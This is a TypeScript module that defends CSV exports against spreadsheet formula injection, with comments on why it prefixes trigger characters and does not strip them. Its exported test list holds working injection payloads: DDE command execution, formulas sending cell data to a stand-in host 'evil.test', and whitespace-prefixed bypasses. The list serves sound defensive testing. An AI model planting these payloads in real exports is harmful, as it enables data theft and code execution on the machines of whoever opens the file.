/**
 * CSV export safety.
 *
 * PURE FUNCTIONS, NO DATABASE, NO CLOCK, NO I/O. Everything here is input ->
 * output, which is what lets `tests/unit/analytics-csv-safety.test.ts`
 * enumerate the injection payloads without a server.
 *
 * ---------------------------------------------------------------------------
 * THE THREAT IS NOT THE FILE. IT IS THE SPREADSHEET THAT OPENS IT.
 * ---------------------------------------------------------------------------
 *
 * A CSV is inert text. Excel, LibreOffice and Google Sheets are not: a cell
 * whose first character is `=`, `+`, `-` or `@` is parsed as a FORMULA, and the
 * formula language of a desktop spreadsheet reaches further than most people
 * expect — `=HYPERLINK` to exfiltrate a cell's neighbours to a URL, `=cmd|...`
 * to reach DDE on Windows, `=WEBSERVICE` to fetch. None of that is a bug in the
 * spreadsheet; it is the spreadsheet working.
 *
 * So the attack on THIS platform is: a learner names something — a class, a
 * course title, their own display name — with a leading `=`. Nothing happens
 * for weeks. Then a head teacher exports the compliance report and opens it,
 * and the formula runs with that head teacher's authority, on that head
 * teacher's machine, with the rest of the school's data on the same sheet.
 *
 * THE PAYLOAD ARRIVES THROUGH ORDINARY, LEGITIMATE WRITES. That is why this is
 * an export-time control and not an input-validation one: refusing `=` in a
 * class name would be refusing a character people have reasons to type, and
 * every other reader of that name is unharmed by it.
 *
 * ---------------------------------------------------------------------------
 * WE PREFIX, WE DO NOT STRIP
 * ---------------------------------------------------------------------------
 *
 * Section 2E says "sanitizing formulas like `=`, `@`, `+`, `-`". There are two
 * ways to read that and they give different files.
 *
 * STRIPPING the character changes the data. A course legitimately called
 * "=Mathematics" becomes "Mathematics", and the report now disagrees with the
 * platform about what something is called. On a compliance export — a document
 * whose whole purpose is to be an accurate record — silently altering values is
 * the worse failure, and it is invisible: nobody diffs an export.
 *
 * PREFIXING with a single quote is the established defence (OWASP). The cell
 * still reads `=Mathematics` to a human in the spreadsheet, the leading
 * apostrophe is a display convention every spreadsheet understands as "this is
 * text", and no formula is parsed. The value survives; only its interpretation
 * changes.
 *
 * The apostrophe IS visible in a plain-text reading of the file, and that is
 * the honest trade: a person doing `cat report.csv` sees the neutralized cell
 * and can tell that something was changed. A stripped value would look like the
 * truth.
 */

/**
 * The characters a spreadsheet treats as "a formula starts here".
 *
 * `=` and `+` are the obvious ones. `-` is here because `-1+1` is a formula and
 * because a negative number typed by a person is indistinguishable from the
 * start of one. `@` begins a legacy Lotus-style function reference that Excel
 * still honours.
 *
 * TAB AND CARRIAGE RETURN ARE HERE TOO, and they are the ones a shorter list
 * misses. Excel strips leading whitespace before deciding whether a cell is a
 * formula, so a tab-prefixed or CR-prefixed `=cmd` reaches the formula parser
 * while defeating a check that only looks at index 0 for the four printable
 * characters. This is the documented bypass for the naive version of this
 * control, and section 2E's list of four is exactly that naive version.
 */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** What we put in front of a dangerous cell. */
const NEUTRALIZER = "'";

/**
 * Control characters that are removed outright.
 *
 * C0 and DEL, MINUS the three that are legitimate inside a quoted CSV field:
 * tab (09), line feed (0A) and carriage return (0D). Written with `\uXXXX`
 * escapes rather than literals because a literal control character in a regex
 * is invisible in a diff and, in this repository's history, has broken Node's
 * TypeScript parser while passing `tsc`.
 */
/*
 * The `no-control-regex` disable below is deliberate and narrow. Matching
 * control characters is the entire purpose of this expression — they are what
 * gets removed. The rule exists to catch them arriving by ACCIDENT, which is
 * the opposite case and worth keeping switched on everywhere else.
 *
 * The directive is ONE line because ESLint applies `disable-next-line` to the
 * line immediately following it, and a `//` comment spanning four lines puts
 * three comment lines in between — which reported an unused directive AND the
 * original error, both at once.
 */
// eslint-disable-next-line no-control-regex -- see above
const CONTROL_CHARACTERS = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g;

/**
 * Makes one value safe to place in a CSV cell.
 *
 * Three things happen, in this order, and the order matters:
 *
 *   1. CONTROL CHARACTERS ARE REMOVED. A NUL or a bare escape in a cell can
 *      terminate a string early in whatever reads the file next. Tab, CR and LF
 *      survive this step because they are legitimate inside a quoted CSV field
 *      and because step 2 needs to see a leading tab to act on it.
 *   2. A FORMULA TRIGGER IS NEUTRALIZED, checked against the first character of
 *      the cleaned string rather than a trimmed one — see `FORMULA_TRIGGERS`.
 *   3. THE FIELD IS QUOTED per RFC 4180, doubling any embedded quote.
 *
 * Doing (3) before (2) would be the classic mistake: the quote character is not
 * a formula trigger, so a value quoted first looks safe to a naive check and is
 * unwrapped back into a formula by the spreadsheet.
 */
export function csvCell(value: unknown): string {
  const text = stringifyCell(value);
  const cleaned = text.replace(CONTROL_CHARACTERS, '');

  const first = cleaned.charAt(0);
  const neutralized =
    isTypedScalar(value) || !FORMULA_TRIGGERS.has(first) ? cleaned : `${NEUTRALIZER}${cleaned}`;

  return `"${neutralized.replace(/"/g, '""')}"`;
}

/**
 * Values that cannot carry a payload, because they were never text.
 *
 * A NEGATIVE NUMBER WOULD OTHERWISE BE NEUTRALIZED, and that is a real cost
 * rather than a hypothetical one: `-5` starts with a formula trigger, so the
 * naive rule prefixes it, and a prefixed cell is TEXT to a spreadsheet. Every
 * negative metric on the sheet would then drop out of the ranges a head teacher
 * sums and averages — which is most of what anybody opens an export to do.
 *
 * A number reaching this function came from `count(*)` or `round(avg(...))`,
 * not from anything a person typed; `stringifyCell` renders it through
 * `String(value)` after a finiteness check, so the result is digits, a decimal
 * point, an exponent and possibly a leading minus. `-5` evaluated as a formula
 * is -5. There is no payload to neutralize, and neutralizing it breaks the
 * file for its actual purpose.
 *
 * THE TEST FOR THIS IS THE TYPE, NOT THE SHAPE OF THE STRING. A string that
 * merely LOOKS numeric — `'-5'` arriving from a class name — is still text from
 * an untrusted source and is still neutralized. That distinction is the whole
 * reason this is a separate predicate rather than a regex on the output.
 */
function isTypedScalar(value: unknown): boolean {
  return typeof value === 'number' || typeof value === 'boolean' || value instanceof Date;
}

/**
 * How each type reaches the file.
 *
 * NULL AND UNDEFINED BECOME EMPTY, NOT "null". A dashboard that prints the word
 * `null` in a cell is telling a head teacher that a metric has a value called
 * null; an empty cell says there is no value, which is what is true. This
 * matters most for `average_mastery_score`, which is deliberately nullable
 * because a school with no evidence has no average — and 0 would read as
 * failure.
 */
function stringifyCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  if (typeof value === 'number') return Number.isFinite(value) ? String(value) : '';
  if (typeof value === 'boolean') return value ? 'true' : 'false';
  return String(value);
}

/** One row. Every cell goes through `csvCell`; there is no fast path. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',');
}

/**
 * A whole document, headers first.
 *
 * CRLF LINE ENDINGS, because RFC 4180 says so and because Excel on Windows
 * misreads a lone LF in some locales. The header row goes through exactly the
 * same sanitizer as the data: a column name is a cell, and the day somebody
 * makes a column name configurable is the day an unsanitized header becomes a
 * hole.
 */
export function toCsv(headers: readonly string[], rows: readonly (readonly unknown[])[]): string {
  return [csvRow(headers), ...rows.map(csvRow)].join('\r\n');
}

/**
 * The filename an export is served under.
 *
 * SEPARATE FROM THE CONTENT AND SANITIZED SEPARATELY, because a filename lands
 * in a `Content-Disposition` header where the danger is different: a quote or a
 * newline there is header injection, not a formula. Anything that is not a
 * plain, safe character becomes a hyphen, and the result is always suffixed
 * `.csv` so a browser cannot be told the file is something else.
 */
export function csvFilename(stem: string): string {
  const safe = stem
    .replace(/[^A-Za-z0-9._-]+/g, '-')
    .replace(/^[-.]+|[-.]+$/g, '')
    .slice(0, 80);
  return `${safe.length > 0 ? safe : 'report'}.csv`;
}

/**
 * The payloads this module must always neutralize, exported so the test suite
 * asserts against ONE list rather than keeping a second, drifting copy.
 *
 * Each is a real technique rather than a variation on `=1+1`: DDE command
 * execution, the two functions that make a cell reach the network, and the
 * whitespace-prefixed forms that walk past a check looking only at index 0.
 */
export const CSV_INJECTION_PAYLOADS: readonly string[] = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(1,1)',
  "=cmd|' /C calc'!A0",
  '=HYPERLINK("http://evil.test?x="&A1,"click")',
  '=WEBSERVICE("http://evil.test")',
  '\t=1+1',
  '\r=1+1',
  '@import',
  '=1+1"',
  "-2+3+cmd|' /C calc'!A0",
];

/**
 * Values that must pass through UNCHANGED except for RFC 4180 quoting.
 *
 * The other half of the contract, and the half a sanitizer usually gets wrong.
 * A control that mangles ordinary school data is a control somebody will
 * eventually be asked to turn off — so the Arabic name, the em dash, the comma
 * in "Smith, Jane" and the apostrophe in "O'Brien" are all asserted to survive.
 */
export const CSV_MUST_NOT_MANGLE: readonly string[] = [
  'Mathematics',
  'Year 10 Physics',
  'أحمد',
  'Grade 7 — Section B',
  'Smith, Jane',
  'A "quoted" title',
  '3.14',
  "O'Brien",
  'x=y',
  'a+b',
  'name@school.test',
];
